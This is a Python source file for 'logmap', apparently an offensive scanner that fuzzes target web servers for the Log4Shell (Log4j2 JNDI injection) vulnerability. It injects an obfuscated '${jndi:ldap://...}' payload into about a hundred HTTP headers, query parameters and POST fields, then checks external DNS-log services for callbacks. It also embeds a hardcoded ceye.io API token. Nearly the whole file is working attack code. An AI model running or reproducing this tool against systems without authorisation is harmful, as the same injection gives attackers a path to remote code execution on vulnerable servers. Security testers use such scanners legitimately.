#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#      __
#     / /  ___  ___ ___ _  ___ ____
#    / /__/ _ \/ _ `/  ' \/ _ `/ _ \
#   /____/\___/\_, /_/_/_/\_,_/ .__/
#             /___/          /_/
#
#  https://github.com/zhzyker/logmap
#  Log4j2 jndi injection fuzz tool
import sys
import time
import json
import socket
import random
import string
import hashlib
import requests
import argparse
import textwrap
import socks
import urllib3
from urllib.parse import urlparse
urllib3.disable_warnings()


def logger(log="green", text=""):
    if log == "green":
        print("\033[92m{}\033[0m".format(text))
    if log == "red":
        print("\033[91m{}\033[0m".format(text))
    if log == "white":
        print("\033[37m{}\033[0m".format(text))
    if log == "yellow":
        print("\033[33m{}\033[0m".format(text))
    if log == "banner":
        print("\033[1;36m{}\033[0m".format(text))


def banners():
    logger("banner", """    __                           
   / /  ___  ___ ___ _  ___ ____ 
  / /__/ _ \/ _ `/  ' \/ _ `/ _ \\
 /____/\___/\_, /_/_/_/\_,_/ .__/
           /___/          /_/    \n""")


def random_md5():
    st = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    md = hashlib.md5("".join(st).encode('utf-8')).hexdigest()
    return str(md)


def arg():
    parser = argparse.ArgumentParser(usage="python3 logmap.py [options]", add_help=False)
    gen = parser.add_argument_group("Help", "How to use")
    gen.add_argument("-u", "--url", dest="url", type=str, help=" Target URL (e.g. http://example.com )")
    gen.add_argument("-f", "--file", dest="file", help="Select a target list file (e.g. list.txt )")
    gen.add_argument("-d", "--dns", dest="dns", metavar="1", type=int, default=1, help="Dnslog [1:log.xn--9tr.com, 2:ceye.io] default 1")
    gen.add_argument("-p", dest="payload", help="Custom payload (e.g. ${jndi:ldap://xx.dns.xx/} ) ")
    gen.add_argument("-t", dest="timeout", metavar="10", default=10, help="Http timeout default 10s")
    gen.add_argument("--proxy", dest="proxy", help="Proxy [socks5/socks4/http] (e.g. http://127.0.0.1:8080)")
    gen.add_argument("-h", "--help", action="help", help="Show this help message and exit")
    return parser.parse_args()


def print_roundtrip(response, *args, **kwargs):
    format_headers = lambda d: '\n'.join(f'{k}: {v}' for k, v in d.items())
    if response.request.body == None:
        return textwrap.dedent('''
               ********************** request **********************

               {req.method} {req.url}
               {reqhdrs}
               
               *****************************************************
           ''').format(
            req=response.request,
            res=response,
            reqhdrs=format_headers(response.request.headers),
            reshdrs=format_headers(response.headers),
        )
    return textwrap.dedent('''
        ********************** request **********************
        
        {req.method} {req.url}
        {reqhdrs}

        {req.body}
        
        *****************************************************
    ''').format(
        req=response.request,
        res=response,
        reqhdrs=format_headers(response.request.headers),
        reshdrs=format_headers(response.headers),
    )


def run_fuzz(target, payload, timeout, domain, token):
    path_payload_list = [
        "/hello",
        "?id={}".format(payload),
        "?username={}".format(payload),
        "?page={}".format(payload),
    ]
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
    }
    headers_payload_lists = {
        "Accept-Charset": payload,
        "Accept-Datetime": payload,
        "Accept-Encoding": payload,
        "Accept-Language": payload,
        "Ali-CDN-Real-IP": payload,
        "Authorization": payload,
        "Cache-Control": payload,
        "Cdn-Real-Ip": payload,
        "Cdn-Src-Ip": payload,
        "CF-Connecting-IP": payload,
        "Client-IP": payload,
        "Contact": payload,
        "Cookie": payload,
        "DNT": payload,
        "Fastly-Client-Ip": payload,
        "Forwarded-For-Ip": payload,
        "Forwarded-For": payload,
        "Forwarded": payload,
        "Forwarded-Proto": payload,
        "From": payload,
        "If-Modified-Since": payload,
        "Max-Forwards": payload,
        "Originating-Ip": payload,
        "Origin": payload,
        "Pragma": payload,
        "Proxy-Client-IP": payload,
        "Proxy": payload,
        "Referer": payload,
        "TE": payload,
        "True-Client-Ip": payload,
        "True-Client-IP": payload,
        "Upgrade": payload,
        "User-Agent": payload,
        "Via": payload,
        "Warning": payload,
        "WL-Proxy-Client-IP": payload,
        "X-Api-Version": payload,
        "X-Att-Deviceid": payload,
        "X-ATT-DeviceId": payload,
        "X-Client-IP"
        "X-Client-Ip": payload,
        "X-Client-IP": payload,
        "X-Cluster-Client-IP": payload,
        "X-Correlation-ID": payload,
        "X-Csrf-Token": payload,
        "X-CSRFToken": payload,
        "X-Do-Not-Track": payload,
        "X-Foo-Bar": payload,
        "X-Foo": payload,
        "X-Forwarded-By": payload,
        "X-Forwarded-For-Original": payload,
        "X-Forwarded-For": payload,
        "X-Forwarded-Host": payload,
        "X-Forwarded": payload,
        "X-Forwarded-Port": payload,
        "X-Forwarded-Protocol": payload,
        "X-Forwarded-Proto": payload,
        "X-Forwarded-Scheme": payload,
        "X-Forwarded-Server": payload,
        "X-Forwarded-Ssl": payload,
        "X-Forwarder-For": payload,
        "X-Forward-For": payload,
        "X-Forward-Proto": payload,
        "X-Frame-Options": payload,
        "X-From": payload,
        "X-Geoip-Country": payload,
        "X-Host": payload,
        "X-Http-Destinationurl": payload,
        "X-Http-Host-Override": payload,
        "X-Http-Method-Override": payload,
        "X-HTTP-Method-Override": payload,
        "X-Http-Method": payload,
        "X-Http-Path-Override": payload,
        "X-Https": payload,
        "X-Htx-Agent": payload,
        "X-Hub-Signature": payload,
        "X-If-Unmodified-Since": payload,
        "X-Imbo-Test-Config": payload,
        "X-Insight": payload,
        "X-Ip": payload,
        "X-Ip-Trail": payload,
        "X-Leakix": payload,
        "X-Original-URL": payload,
        "X-Originating-IP": payload,
        "X-ProxyUser-Ip": payload,
        "X-Real-Ip": payload,
        "X-Remote-Addr": payload,
        "X-Remote-IP": payload,
        "X-Requested-With": payload,
        "X-Request-ID": payload,
        "X-True-IP": payload,
        "X-UIDH": payload,
        "X-Wap-Profile": payload,
        "X-WAP-Profile": payload,
        "X-XSRF-TOKEN": payload,
    }
    body_payload_lists = [
        'payload={}'.format(payload),
        'user={}'.format(payload),
        'pass={}'.format(payload),
        'username={}'.format(payload),
        'password={}'.format(payload),
        'login={}'.format(payload),
        'email={}'.format(payload),
        'principal={}'.format(payload),
        'token={}'.format(payload),
        'verify={}'.format(payload),
    ]
    result_md5_req = {}
    for (key, value) in headers_payload_lists.items():
        ua = ""
        if key == "User-Agent":
            ua = headers[key]
        md5 = random_md5()
        dns_domain = md5 + "." + domain
        logger("green", "[*] Fuzz headers: {}".format(key))
        key = key.replace("DNS_LOG_DOMAIN", dns_domain)
        value = value.replace("DNS_LOG_DOMAIN", dns_domain)
        headers[key] = value
        try:
            req = requests.get(target, timeout=timeout, headers=headers, verify=False)
            result_md5_req[md5] = print_roundtrip(req)
        except:
            logger("green", "[-] Fuzz headers: {} failed".format(key))
            result_md5_req[md5] = "payload: {}: {}".format(key, value)
        del headers[key]
        if key == "User-Agent":
            headers[key] = ua
    for path in path_payload_list:
        if "DNS_LOG_DOMAIN" not in path and "$" not in path:
            for body in body_payload_lists:
                md5 = random_md5()
                dns_domain = md5 + "." + domain
                body = body.replace("DNS_LOG_DOMAIN", dns_domain)
                logger("green", "[*] Fuzz body: {}".format(body))
                try:
                    req = requests.post(target + path, data=body, timeout=timeout, headers=headers, verify=False)
                    result_md5_req[md5] = print_roundtrip(req)
                except:
                    logger("green", "[-] Fuzz body: {} failed".format(body))
                    result_md5_req[md5] = "payload: {}".format(body)

        md5 = random_md5()
        dns_domain = md5 + "." + domain
        path = path.replace("DNS_LOG_DOMAIN", dns_domain)
        logger("green", "[*] Fuzz url path: {}".format(path))
        try:
            req = requests.get(target + path, timeout=timeout, headers=headers, verify=False)
            result_md5_req[md5] = print_roundtrip(req)
        except:
            logger("green", "[-] Fuzz url path: {} failed".format(path))
            result_md5_req[md5] = "payload: {}".format(path)
    if args.payload:
        logger("yellow", "[*] Please check your dns")
    else:
        if dns_verify(args, result_md5_req, token):
            logger("green", "[+] Log4j2 fuzz end")
        else:
            logger("yellow", "[-] Not found Log4j2 vuln, fuzz end")


def check_log4j2(args):
    dns_result = dnslog(args, type=args.dns)
    domain = dns_result[0]
    token = dns_result[1]
    timeout = args.timeout
    if args.payload:
        payload = args.payload
    else:
        payload = "${jndi:ldap://DNS_LOG_DOMAIN/}"
        payload = "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//DNS_LOG_DOMAIN/a}"
    logger("yellow", "[*] Get domain: {} token: {}".format(domain, token))
    logger("yellow", "[+] Use paylaod: {}".format(payload.replace("DNS_LOG_DOMAIN", "md5." + domain)))
    if args.file:
        for line in open(args.file):
            line = line.strip()
            line = line.strip("\r\n")
            if line == "":
                continue
            logger("yellow", "[+] Check target: {}".format(line))
            if not line:
                break
            run_fuzz(line, payload, timeout, domain, token)
    else:
        run_fuzz(args.url, payload, timeout, domain, token)



def dns_verify(args, result_md5_req, token):
    dnslog_result = dnslog(args, type=args.dns, function="verify", token=token)
    if dnslog_result:
        for (key, value) in result_md5_req.items():
            if key in dnslog_result:
                logger("red", "[+] Found the Log4j2 vulnerability, Md5 is: {}".format(key))
                logger("white", value)
                return True
    logger("red", "[-] Dns result failed")
    return False


def dnslog(args, type=1, function="get", token="", md5=""):
    if type == 1:
        if function == "get":
            try:
                request = requests.get("https://log.xn--9tr.com/new_gen", headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"})
                domain = json.loads(request.text)["domain"]
                key = json.loads(request.text)["key"]
                token = json.loads(request.text)["token"]
                result = [domain, token]
                return result
            except:
                logger("red", "[-] https://log.xn--9tr.com/new_gen Request failed")
        elif function == "verify":
            try:
                time.sleep(2)
                request = requests.get("https://log.xn--9tr.com/" + token)
                if "null" not in request.text:
                    return request.text
            except:
                logger("red", "[-] https://log.xn--9tr.com/new_gen Request failed")
        return ["null", "null"]
    elif type == 2:
        if function == "get":
            if "xxxxxx" in args.ceye[0]:
                logger("red", "[-] Need to set domain and token http://ceye.io")
                sys.exit(0)
            return args.ceye
        elif function == "verify":
            try:
                time.sleep(2)
                request = requests.get("http://api.ceye.io/v1/records?token=843fd6d58a8ebede756a2b991d321a5a&type=dns")
                return request.text
            except:
                logger("red", "[-] http://api.ceye.io/v1/ Request failed")
        return ["null", "null"]


def proxy(args):
    if args.proxy:
        _url = urlparse(args.proxy)
        hostname = _url.hostname
        port = _url.port
        scheme = _url.scheme
        if "http" in scheme:
            socks.set_default_proxy(socks.HTTP, hostname, port)
            socket.socket = socks.socksocket
        elif "socks5" in scheme:
            socks.set_default_proxy(socks.SOCKS5, hostname, port)
            socket.socket = socks.socksocket
        elif "socks4" in scheme:
            socks.set_default_proxy(socks.SOCKS4, hostname, port)
            socket.socket = socks.socksocket
        logger("yellow", "[+] Use proxy {}".format(args.proxy))


if __name__ == '__main__':
    banners()
    logger("yellow", "[*] Log4j2 jndi injection fuzz tool")
    logger("yellow", "[*] from https://github.com/zhzyker/logmap")
    args = arg()
    args.ceye = ["xxxxxx.ceye.io", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
    proxy(args)
    check_log4j2(args)
